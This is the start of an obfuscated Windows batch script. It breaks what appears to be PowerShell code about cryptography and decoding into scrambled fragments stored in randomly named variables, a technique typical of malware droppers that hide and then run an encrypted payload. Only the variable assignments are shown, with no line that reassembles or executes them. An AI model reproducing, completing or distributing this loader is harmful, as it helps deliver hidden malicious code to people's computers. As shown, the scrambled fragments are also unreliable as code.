@echo off
set "oBRvUUlnYn=..-1"
set "XUfZKDZVBk= if "
set "wiQSIePKNd==');"
set "LgOgiktlcB=ptog"
set "AgrebyoFfW=y.Cr"
set "tmBJBsBJzP=znSk"
set "udhWlpwmsk=stem"
set "lUogpkkLMH=).Sp"
set "wgGbgsFtpG=form"
set "LydpoJCsAh=Disp"
set "xlUDisPOMO=oryS"
set "CECjGoZuqR= New"
set "lyyVhXveZT=);$M"
set "hHQmKxdGCL=ct S"
set "wBGfXQNAhO=Q = "
set "zuXJMOsikW=$LKj"
set "HOzwEKfljN=)($O"
set "SWmqETpLsS=3); "
set "RptUpgzKLo= [st"
set "PbmuLvqrgB=$CFi"
set "qfVvNNlbsO='[-1"
set "wBHPBjYnKl=fore"
set "GHFQOjpgnN=);$C"
set "hdQJmbSwRH=mMK4"
set "qMiVmFTOku=oL'["
set "SoGlZIjBOe=6esa"
set "PZTgznlAiP=comm"
